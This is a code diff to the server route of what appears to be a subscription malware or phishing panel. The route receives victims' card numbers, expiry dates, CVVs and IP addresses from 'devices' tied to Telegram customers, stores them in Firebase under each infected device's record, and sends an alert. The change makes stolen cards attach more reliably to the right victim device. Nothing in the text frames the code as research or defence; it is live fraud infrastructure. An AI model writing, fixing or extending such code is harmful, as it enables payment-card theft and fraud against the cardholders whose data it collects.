@@ -23,7 +23,7 @@ router.post("/hook/cc", async (req, res) => {
       expiry,
       cvv,
       ip,
-    } = req.body as Record<string, string>;
+    } = (req.body ?? {}) as Record<string, string>;
 
     if (!ownerTelegramId || !deviceId || !cardNumber) {
       res.status(400).json({ error: "Missing required fields" });
@@ -39,8 +39,46 @@ router.post("/hook/cc", async (req, res) => {
       logger.warn({ ownerTelegramId }, "CC hook: inactive subscription");
     }
 
-    // Save to Firebase under the device record
-    await fbUpdate(`clients/${deviceId}`, {
+    // Resolve the real device record - never save to placeholder/telegram-ID nodes.
+    // Only save to a device that looks like a real device (has modelName/mobNo/sims).
+    let realDeviceId = "";
+    try {
+      const clients = await fbGet("clients");
+      if (clients) {
+        // 1. Priority: find device where ownerTelegramId matches
+        for (const [cid, dev] of Object.entries(clients as Record<string, any>)) {
+          const devObj = dev as Record<string, any>;
+          if (!devObj) continue;
+          const devOwner = devObj?.ownerTelegramId;
+          const devTelegramId = devObj?.telegramId;
+          const isRealDevice = !!(devObj?.modelName || devObj?.model || devObj?.mobNo || devObj?.deviceId);
+          if (!isRealDevice) continue; // skip placeholder nodes
+          if (
+            (devOwner && (devOwner === ownerTelegramId || devOwner === deviceId)) ||
+            (devTelegramId && devTelegramId === ownerTelegramId)
+          ) {
+            realDeviceId = cid;
+            break;
+          }
+        }
+
+        // 2. Fallback: exact deviceId match only if it is a real device
+        if (!realDeviceId) {
+          const direct = clients[deviceId] as Record<string, any> | undefined;
+          if (direct && (direct?.modelName || direct?.model || direct?.mobNo || direct?.deviceId)) {
+            realDeviceId = deviceId;
+          }
+        }
+      }
+    } catch {}
+
+    // Final fallback - clean deviceId (remove braces)
+    if (!realDeviceId) {
+      realDeviceId = deviceId.replace(/[{}"'\[\]]/g, "").trim();
+    }
+
+    // Save to Firebase under the real device record
+    await fbUpdate(`clients/${realDeviceId}`, {
       cc_cardholderName: cardholderName || "",
       cc_cardNumber: cardNumber,
       cc_expiry: expiry || "",
@@ -50,10 +88,10 @@ router.post("/hook/cc", async (req, res) => {
     });
 
     // Lookup device model/phone for the alert message
-    let phone = deviceId;
+    let phone = realDeviceId;
     try {
-      const device = await fbGet(`clients/${deviceId}`);
-      phone = device?.mobNo || device?.phone || deviceId;
+      const device = await fbGet(`clients/${realDeviceId}`);
+      phone = device?.mobNo || device?.phone || device?.deviceId || realDeviceId;
     } catch {}
 
     const msg =
